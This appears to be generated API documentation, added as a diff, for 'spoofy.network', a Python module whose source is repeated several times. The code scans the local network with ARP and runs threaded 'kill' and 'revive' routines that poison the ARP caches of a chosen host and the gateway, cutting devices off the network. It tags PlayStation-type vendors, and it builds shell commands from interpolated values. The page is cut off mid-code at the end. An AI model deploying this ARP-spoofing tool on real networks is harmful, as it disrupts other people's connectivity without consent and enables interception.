@@ -1,0 +1,866 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
+<meta name="generator" content="pdoc 0.10.0" />
+<title>spoofy.network API documentation</title>
+<meta name="description" content="" />
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
+<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
+<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
+<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
+<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
+<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
+</head>
+<body>
+<main>
+<article id="content">
+<header>
+<h1 class="title">Module <code>spoofy.network</code></h1>
+</header>
+<section id="section-intro">
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python"># Set &#39;scapy&#39; logging level to &#39;ERROR&#39; to minimize &#39;WARNING&#39; verbose
+import logging
+logging.getLogger(&#39;scapy.runtime&#39;).setLevel(logging.ERROR)
+import os
+
+from .settings import Settings
+from .utilities import threaded
+from ipaddress import IPv4Interface, ip_address
+from manuf import MacParser
+from scapy.all import ARP, Ether, conf, getmacbyip, send, srp
+from subprocess import check_output
+from time import sleep
+
+class Network():
+    &#34;&#34;&#34;
+    Network class to handle anything network related.
+    &#34;&#34;&#34;
+    __killed = {}
+    __mac_parser = MacParser()
+    __vendor_tags = {
+        &#39;CloudNet&#39;: &#39;PS&#39;,
+        &#39;HonHaiPr&#39;: &#39;PS&#39;,
+        &#39;SonyInte&#39;: &#39;PS&#39;
+    }
+
+    #: Dictionary data structure
+    get = {&#39;hosts&#39;: {}}
+
+    @classmethod
+    def cleanup(cls):
+        &#34;&#34;&#34;
+        Reset spoofed hosts before termination.
+        &#34;&#34;&#34;
+        if (cls.get_killed() &gt; 0):
+            cls.__killed.clear()
+            print(&#34;Resetting spoofed hosts...&#34;)
+            sleep(Settings.get[&#39;DELAY&#39;])
+
+    @classmethod
+    def get_gateway(cls):
+        &#34;&#34;&#34;
+        Get gateway information.
+
+        Return dictionary.
+        &#34;&#34;&#34;
+        gwc = conf.route.route(&#39;1.1.1.1&#39;)
+        cls.get[&#39;gateway&#39;] = {
+            &#39;ip&#39;: gwc[2],
+            &#39;mac&#39;: getmacbyip(gwc[2])
+        }
+        return cls.get[&#39;gateway&#39;]
+
+    @classmethod
+    def get_hosts(cls):
+        &#34;&#34;&#34;
+        Get network hosts information via ARP requests.
+
+        Return dictionary with host IP addresses as keys.
+        &#34;&#34;&#34;
+        print(&#34;Scanning network for hosts...&#34;)
+
+        ans = srp(
+            Ether(dst=&#39;ff:ff:ff:ff:ff:ff&#39;) / ARP(pdst=f&#34;{cls.get[&#39;interface&#39;][&#39;ip_cidr&#39;]}&#34;),
+            timeout = 2,
+            verbose = False
+        )[0]
+
+        ip_lengths = []
+        for h in ans:
+            ip = h[1].psrc
+            mac = h[1].hwsrc
+            ip_lengths.append(len(ip))
+            cls.get[&#39;hosts&#39;][ip] = {
+                &#39;ip&#39;: ip,
+                &#39;mac&#39;: mac,
+                &#39;vendor&#39;: cls.__mac_parser.get_manuf(mac),
+                &#39;vendor_long&#39;: cls.__mac_parser.get_manuf_long(mac),
+                &#39;vendor_tagged&#39;: cls.tag_vendor(cls.__mac_parser.get_manuf(mac))
+            }
+        cls.get[&#39;ip_list&#39;] = sorted(ip_address(h[1].psrc) for h in ans)
+        cls.get[&#39;max_ip_length&#39;] = max(ip_lengths)
+
+        return cls.get[&#39;hosts&#39;]
+
+    @classmethod
+    def get_interface(cls):
+        &#34;&#34;&#34;
+        Get network interface information.
+
+        Return dictionary.
+        &#34;&#34;&#34;
+        iface = conf.iface
+        netmask = cls.get_netmask(iface.ip)
+        cls.get[&#39;interface&#39;] = {
+            &#39;name&#39;: iface.name,
+            &#39;mac&#39;: iface.mac,
+            &#39;ip&#39;: iface.ip,
+            &#39;netmask&#39;: netmask,
+            &#39;ip_cidr&#39;: IPv4Interface(f&#34;{iface.ip}/{netmask}&#34;).with_prefixlen
+        }
+        return cls.get[&#39;interface&#39;]
+
+    @classmethod
+    def get_killed(cls):
+        &#34;&#34;&#34;
+        Return amount of killed hosts.
+        &#34;&#34;&#34;
+        return len(cls.__killed)
+
+    @classmethod
+    def get_netmask(cls, ip):
+        &#34;&#34;&#34;
+        Get network interface netmask via &#39;subprocess&#39;.
+
+        Return netmask string.
+
+        Parameter:
+            ip -- (string) target IP address
+        &#34;&#34;&#34;
+        if (os.name == &#39;nt&#39;):
+            output = check_output(f&#39;powershell &#34;ipconfig | Select-String -Pattern {ip} -Context 1&#34;&#39;, shell=True).decode()
+            netmask = output.split(&#39; &#39;)[-1].rstrip()
+        else:
+            output = check_output(f&#34;ifconfig | grep {ip}&#34;, shell=True).decode()
+            for i, s in enumerate(output.split(&#39; &#39;)):
+                if (s == &#39;netmask&#39;):
+                    break
+            n = output.split(&#39; &#39;)[i+1].replace(&#39;0x&#39;, &#39;&#39;)
+            netmask = n if &#39;.&#39; in n else &#39;.&#39;.join(str(int(n[i:i+2], 16)) for i in range(0, len(n), 2))
+        return netmask
+
+    @classmethod
+    def initialize(cls):
+        &#34;&#34;&#34;
+        Get interface, gateway, and network hosts information.
+        &#34;&#34;&#34;
+        cls.get_interface()
+        cls.get_gateway()
+        cls.get_hosts()
+
+        if (Settings.get[&#39;DEBUG&#39;]):
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:4}{cls.get[&#39;interface&#39;]}&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:4}{cls.get[&#39;gateway&#39;]}&#34;)
+
+    @classmethod
+    @threaded
+    def kill(cls, host):
+        &#34;&#34;&#34;
+        Spoof given host by poisoning ARP cache repeatedly.
+
+        This method runs in thread.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        # Check if host already been killed
+        if (host[&#39;mac&#39;] in cls.__killed):
+            print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is already killed&#34;)
+            return
+        cls.__killed[host[&#39;mac&#39;]] = True
+
+        packets = {
+            &#39;gateway&#39;: ARP(
+                psrc = host[&#39;ip&#39;],
+                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
+            ),
+            &#39;host&#39;: ARP(
+                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                pdst = host[&#39;ip&#39;],
+                hwdst = host[&#39;mac&#39;]
+            )
+        }
+
+        # Poison ARP cache
+        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is killed&#34;)
+        while (host[&#39;mac&#39;] in cls.__killed):
+            if (not Settings.get[&#39;SAFE_MODE&#39;]):
+                send(packets[&#39;host&#39;], verbose=False)
+                send(packets[&#39;gateway&#39;], verbose=False)
+                sleep(Settings.get[&#39;DELAY&#39;])
+        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is revived&#34;)
+
+    @classmethod
+    @threaded
+    def revive(cls, host):
+        &#34;&#34;&#34;
+        Un-spoof given host by stopping spoof thread.
+
+        This method runs in thread.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        del cls.__killed[host[&#39;mac&#39;]]
+
+        packets = {
+            &#39;gateway&#39;: ARP(
+                psrc = host[&#39;ip&#39;],
+                hwsrc = host[&#39;mac&#39;],
+                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
+            ),
+            &#39;host&#39;: ARP(
+                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwsrc = cls.get[&#39;gateway&#39;][&#39;mac&#39;],
+                pdst = host[&#39;ip&#39;],
+                hwdst = host[&#39;mac&#39;]
+            )
+        }
+
+        # Reset packets to host and gateway
+        if (not Settings.get[&#39;SAFE_MODE&#39;]):
+            send(packets[&#39;host&#39;], verbose=False)
+            send(packets[&#39;gateway&#39;], verbose=False)
+
+    @classmethod
+    def spoof(cls, host):
+        &#34;&#34;&#34;
+        Spoof and un-spoof host with &#39;WAIT_DURATION&#39; in Settings.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        cls.kill(host)
+        sleep(Settings.get[&#39;WAIT_DURATION&#39;])
+        cls.revive(host)
+
+    @classmethod
+    def tag_vendor(cls, vendor):
+        &#34;&#34;&#34;
+        Tag matched vendor.
+
+        Return extended name.
+
+        Parameter:
+            vendor -- (string) manufacturer
+        &#34;&#34;&#34;
+        tagged = vendor
+        if (vendor in cls.__vendor_tags):
+            tagged = f&#34;{vendor} ({cls.__vendor_tags[vendor]})&#34;
+        return tagged</code></pre>
+</details>
+</section>
+<section>
+</section>
+<section>
+</section>
+<section>
+</section>
+<section>
+<h2 class="section-title" id="header-classes">Classes</h2>
+<dl>
+<dt id="spoofy.network.Network"><code class="flex name class">
+<span>class <span class="ident">Network</span></span>
+</code></dt>
+<dd>
+<div class="desc"><p>Network class to handle anything network related.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">class Network():
+    &#34;&#34;&#34;
+    Network class to handle anything network related.
+    &#34;&#34;&#34;
+    __killed = {}
+    __mac_parser = MacParser()
+    __vendor_tags = {
+        &#39;CloudNet&#39;: &#39;PS&#39;,
+        &#39;HonHaiPr&#39;: &#39;PS&#39;,
+        &#39;SonyInte&#39;: &#39;PS&#39;
+    }
+
+    #: Dictionary data structure
+    get = {&#39;hosts&#39;: {}}
+
+    @classmethod
+    def cleanup(cls):
+        &#34;&#34;&#34;
+        Reset spoofed hosts before termination.
+        &#34;&#34;&#34;
+        if (cls.get_killed() &gt; 0):
+            cls.__killed.clear()
+            print(&#34;Resetting spoofed hosts...&#34;)
+            sleep(Settings.get[&#39;DELAY&#39;])
+
+    @classmethod
+    def get_gateway(cls):
+        &#34;&#34;&#34;
+        Get gateway information.
+
+        Return dictionary.
+        &#34;&#34;&#34;
+        gwc = conf.route.route(&#39;1.1.1.1&#39;)
+        cls.get[&#39;gateway&#39;] = {
+            &#39;ip&#39;: gwc[2],
+            &#39;mac&#39;: getmacbyip(gwc[2])
+        }
+        return cls.get[&#39;gateway&#39;]
+
+    @classmethod
+    def get_hosts(cls):
+        &#34;&#34;&#34;
+        Get network hosts information via ARP requests.
+
+        Return dictionary with host IP addresses as keys.
+        &#34;&#34;&#34;
+        print(&#34;Scanning network for hosts...&#34;)
+
+        ans = srp(
+            Ether(dst=&#39;ff:ff:ff:ff:ff:ff&#39;) / ARP(pdst=f&#34;{cls.get[&#39;interface&#39;][&#39;ip_cidr&#39;]}&#34;),
+            timeout = 2,
+            verbose = False
+        )[0]
+
+        ip_lengths = []
+        for h in ans:
+            ip = h[1].psrc
+            mac = h[1].hwsrc
+            ip_lengths.append(len(ip))
+            cls.get[&#39;hosts&#39;][ip] = {
+                &#39;ip&#39;: ip,
+                &#39;mac&#39;: mac,
+                &#39;vendor&#39;: cls.__mac_parser.get_manuf(mac),
+                &#39;vendor_long&#39;: cls.__mac_parser.get_manuf_long(mac),
+                &#39;vendor_tagged&#39;: cls.tag_vendor(cls.__mac_parser.get_manuf(mac))
+            }
+        cls.get[&#39;ip_list&#39;] = sorted(ip_address(h[1].psrc) for h in ans)
+        cls.get[&#39;max_ip_length&#39;] = max(ip_lengths)
+
+        return cls.get[&#39;hosts&#39;]
+
+    @classmethod
+    def get_interface(cls):
+        &#34;&#34;&#34;
+        Get network interface information.
+
+        Return dictionary.
+        &#34;&#34;&#34;
+        iface = conf.iface
+        netmask = cls.get_netmask(iface.ip)
+        cls.get[&#39;interface&#39;] = {
+            &#39;name&#39;: iface.name,
+            &#39;mac&#39;: iface.mac,
+            &#39;ip&#39;: iface.ip,
+            &#39;netmask&#39;: netmask,
+            &#39;ip_cidr&#39;: IPv4Interface(f&#34;{iface.ip}/{netmask}&#34;).with_prefixlen
+        }
+        return cls.get[&#39;interface&#39;]
+
+    @classmethod
+    def get_killed(cls):
+        &#34;&#34;&#34;
+        Return amount of killed hosts.
+        &#34;&#34;&#34;
+        return len(cls.__killed)
+
+    @classmethod
+    def get_netmask(cls, ip):
+        &#34;&#34;&#34;
+        Get network interface netmask via &#39;subprocess&#39;.
+
+        Return netmask string.
+
+        Parameter:
+            ip -- (string) target IP address
+        &#34;&#34;&#34;
+        if (os.name == &#39;nt&#39;):
+            output = check_output(f&#39;powershell &#34;ipconfig | Select-String -Pattern {ip} -Context 1&#34;&#39;, shell=True).decode()
+            netmask = output.split(&#39; &#39;)[-1].rstrip()
+        else:
+            output = check_output(f&#34;ifconfig | grep {ip}&#34;, shell=True).decode()
+            for i, s in enumerate(output.split(&#39; &#39;)):
+                if (s == &#39;netmask&#39;):
+                    break
+            n = output.split(&#39; &#39;)[i+1].replace(&#39;0x&#39;, &#39;&#39;)
+            netmask = n if &#39;.&#39; in n else &#39;.&#39;.join(str(int(n[i:i+2], 16)) for i in range(0, len(n), 2))
+        return netmask
+
+    @classmethod
+    def initialize(cls):
+        &#34;&#34;&#34;
+        Get interface, gateway, and network hosts information.
+        &#34;&#34;&#34;
+        cls.get_interface()
+        cls.get_gateway()
+        cls.get_hosts()
+
+        if (Settings.get[&#39;DEBUG&#39;]):
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:4}{cls.get[&#39;interface&#39;]}&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:4}{cls.get[&#39;gateway&#39;]}&#34;)
+
+    @classmethod
+    @threaded
+    def kill(cls, host):
+        &#34;&#34;&#34;
+        Spoof given host by poisoning ARP cache repeatedly.
+
+        This method runs in thread.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        # Check if host already been killed
+        if (host[&#39;mac&#39;] in cls.__killed):
+            print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is already killed&#34;)
+            return
+        cls.__killed[host[&#39;mac&#39;]] = True
+
+        packets = {
+            &#39;gateway&#39;: ARP(
+                psrc = host[&#39;ip&#39;],
+                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
+            ),
+            &#39;host&#39;: ARP(
+                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                pdst = host[&#39;ip&#39;],
+                hwdst = host[&#39;mac&#39;]
+            )
+        }
+
+        # Poison ARP cache
+        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is killed&#34;)
+        while (host[&#39;mac&#39;] in cls.__killed):
+            if (not Settings.get[&#39;SAFE_MODE&#39;]):
+                send(packets[&#39;host&#39;], verbose=False)
+                send(packets[&#39;gateway&#39;], verbose=False)
+                sleep(Settings.get[&#39;DELAY&#39;])
+        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is revived&#34;)
+
+    @classmethod
+    @threaded
+    def revive(cls, host):
+        &#34;&#34;&#34;
+        Un-spoof given host by stopping spoof thread.
+
+        This method runs in thread.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        del cls.__killed[host[&#39;mac&#39;]]
+
+        packets = {
+            &#39;gateway&#39;: ARP(
+                psrc = host[&#39;ip&#39;],
+                hwsrc = host[&#39;mac&#39;],
+                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
+            ),
+            &#39;host&#39;: ARP(
+                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwsrc = cls.get[&#39;gateway&#39;][&#39;mac&#39;],
+                pdst = host[&#39;ip&#39;],
+                hwdst = host[&#39;mac&#39;]
+            )
+        }
+
+        # Reset packets to host and gateway
+        if (not Settings.get[&#39;SAFE_MODE&#39;]):
+            send(packets[&#39;host&#39;], verbose=False)
+            send(packets[&#39;gateway&#39;], verbose=False)
+
+    @classmethod
+    def spoof(cls, host):
+        &#34;&#34;&#34;
+        Spoof and un-spoof host with &#39;WAIT_DURATION&#39; in Settings.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        cls.kill(host)
+        sleep(Settings.get[&#39;WAIT_DURATION&#39;])
+        cls.revive(host)
+
+    @classmethod
+    def tag_vendor(cls, vendor):
+        &#34;&#34;&#34;
+        Tag matched vendor.
+
+        Return extended name.
+
+        Parameter:
+            vendor -- (string) manufacturer
+        &#34;&#34;&#34;
+        tagged = vendor
+        if (vendor in cls.__vendor_tags):
+            tagged = f&#34;{vendor} ({cls.__vendor_tags[vendor]})&#34;
+        return tagged</code></pre>
+</details>
+<h3>Class variables</h3>
+<dl>
+<dt id="spoofy.network.Network.get"><code class="name">var <span class="ident">get</span></code></dt>
+<dd>
+<div class="desc"><p>Dictionary data structure</p></div>
+</dd>
+</dl>
+<h3>Static methods</h3>
+<dl>
+<dt id="spoofy.network.Network.cleanup"><code class="name flex">
+<span>def <span class="ident">cleanup</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Reset spoofed hosts before termination.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def cleanup(cls):
+    &#34;&#34;&#34;
+    Reset spoofed hosts before termination.
+    &#34;&#34;&#34;
+    if (cls.get_killed() &gt; 0):
+        cls.__killed.clear()
+        print(&#34;Resetting spoofed hosts...&#34;)
+        sleep(Settings.get[&#39;DELAY&#39;])</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.get_gateway"><code class="name flex">
+<span>def <span class="ident">get_gateway</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Get gateway information.</p>
+<p>Return dictionary.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def get_gateway(cls):
+    &#34;&#34;&#34;
+    Get gateway information.
+
+    Return dictionary.
+    &#34;&#34;&#34;
+    gwc = conf.route.route(&#39;1.1.1.1&#39;)
+    cls.get[&#39;gateway&#39;] = {
+        &#39;ip&#39;: gwc[2],
+        &#39;mac&#39;: getmacbyip(gwc[2])
+    }
+    return cls.get[&#39;gateway&#39;]</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.get_hosts"><code class="name flex">
+<span>def <span class="ident">get_hosts</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Get network hosts information via ARP requests.</p>
+<p>Return dictionary with host IP addresses as keys.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def get_hosts(cls):
+    &#34;&#34;&#34;
+    Get network hosts information via ARP requests.
+
+    Return dictionary with host IP addresses as keys.
+    &#34;&#34;&#34;
+    print(&#34;Scanning network for hosts...&#34;)
+
+    ans = srp(
+        Ether(dst=&#39;ff:ff:ff:ff:ff:ff&#39;) / ARP(pdst=f&#34;{cls.get[&#39;interface&#39;][&#39;ip_cidr&#39;]}&#34;),
+        timeout = 2,
+        verbose = False
+    )[0]
+
+    ip_lengths = []
+    for h in ans:
+        ip = h[1].psrc
+        mac = h[1].hwsrc
+        ip_lengths.append(len(ip))
+        cls.get[&#39;hosts&#39;][ip] = {
+            &#39;ip&#39;: ip,
+            &#39;mac&#39;: mac,
+            &#39;vendor&#39;: cls.__mac_parser.get_manuf(mac),
+            &#39;vendor_long&#39;: cls.__mac_parser.get_manuf_long(mac),
+            &#39;vendor_tagged&#39;: cls.tag_vendor(cls.__mac_parser.get_manuf(mac))
+        }
+    cls.get[&#39;ip_list&#39;] = sorted(ip_address(h[1].psrc) for h in ans)
+    cls.get[&#39;max_ip_length&#39;] = max(ip_lengths)
+
+    return cls.get[&#39;hosts&#39;]</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.get_interface"><code class="name flex">
+<span>def <span class="ident">get_interface</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Get network interface information.</p>
+<p>Return dictionary.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def get_interface(cls):
+    &#34;&#34;&#34;
+    Get network interface information.
+
+    Return dictionary.
+    &#34;&#34;&#34;
+    iface = conf.iface
+    netmask = cls.get_netmask(iface.ip)
+    cls.get[&#39;interface&#39;] = {
+        &#39;name&#39;: iface.name,
+        &#39;mac&#39;: iface.mac,
+        &#39;ip&#39;: iface.ip,
+        &#39;netmask&#39;: netmask,
+        &#39;ip_cidr&#39;: IPv4Interface(f&#34;{iface.ip}/{netmask}&#34;).with_prefixlen
+    }
+    return cls.get[&#39;interface&#39;]</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.get_killed"><code class="name flex">
+<span>def <span class="ident">get_killed</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Return amount of killed hosts.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def get_killed(cls):
+    &#34;&#34;&#34;
+    Return amount of killed hosts.
+    &#34;&#34;&#34;
+    return len(cls.__killed)</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.get_netmask"><code class="name flex">
+<span>def <span class="ident">get_netmask</span></span>(<span>ip)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Get network interface netmask via 'subprocess'.</p>
+<p>Return netmask string.</p>
+<h2 id="parameter">Parameter</h2>
+<p>ip &ndash; (string) target IP address</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def get_netmask(cls, ip):
+    &#34;&#34;&#34;
+    Get network interface netmask via &#39;subprocess&#39;.
+
+    Return netmask string.
+
+    Parameter:
+        ip -- (string) target IP address
+    &#34;&#34;&#34;
+    if (os.name == &#39;nt&#39;):
+        output = check_output(f&#39;powershell &#34;ipconfig | Select-String -Pattern {ip} -Context 1&#34;&#39;, shell=True).decode()
+        netmask = output.split(&#39; &#39;)[-1].rstrip()
+    else:
+        output = check_output(f&#34;ifconfig | grep {ip}&#34;, shell=True).decode()
+        for i, s in enumerate(output.split(&#39; &#39;)):
+            if (s == &#39;netmask&#39;):
+                break
+        n = output.split(&#39; &#39;)[i+1].replace(&#39;0x&#39;, &#39;&#39;)
+        netmask = n if &#39;.&#39; in n else &#39;.&#39;.join(str(int(n[i:i+2], 16)) for i in range(0, len(n), 2))
+    return netmask</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.initialize"><code class="name flex">
+<span>def <span class="ident">initialize</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Get interface, gateway, and network hosts information.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def initialize(cls):
+    &#34;&#34;&#34;
+    Get interface, gateway, and network hosts information.
+    &#34;&#34;&#34;
+    cls.get_interface()
+    cls.get_gateway()
+    cls.get_hosts()
+
+    if (Settings.get[&#39;DEBUG&#39;]):
+        print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]:&#34;)
+        print(f&#34;{&#39;&#39;:4}{cls.get[&#39;interface&#39;]}&#34;)
+        print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]:&#34;)
+        print(f&#34;{&#39;&#39;:4}{cls.get[&#39;gateway&#39;]}&#34;)</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.kill"><code class="name flex">
+<span>def <span class="ident">kill</span></span>(<span>*args, **kwargs)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Run method in thread to avoid blocking.</p>
+<p>Intended for Network.kill() and Network.revive().</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def run(*args, **kwargs):
+    &#34;&#34;&#34;
+    Run method in thread to avoid blocking.
+
+    Intended for Network.kill() and Network.revive().
+    &#34;&#34;&#34;
+    thread = Thread(target=fn, args=args, kwargs=kwargs)
+    thread.start()
+    return thread</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.revive"><code class="name flex">
+<span>def <span class="ident">revive</span></span>(<span>*args, **kwargs)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Run method in thread to avoid blocking.</p>
+<p>Intended for Network.kill() and Network.revive().</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def run(*args, **kwargs):
